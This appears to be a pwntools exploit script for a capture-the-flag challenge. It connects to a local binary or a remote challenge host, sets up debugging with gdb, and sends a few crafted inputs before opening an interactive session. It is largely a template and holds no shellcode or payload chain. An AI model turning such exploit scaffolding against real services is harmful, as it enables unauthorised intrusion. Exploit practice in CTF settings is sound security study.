from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
libc_path = "./libc.so.6"
ld_path = "./ld-linux-x86-64.so.2"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(vuln_path)
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("mc.ax", 30284)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


io.sendlineafter("code?\n", "100")
io.sendlineafter("memory?\n", "100")

ddebug()
io.sendafter("code:", "!5")
io.interactive()
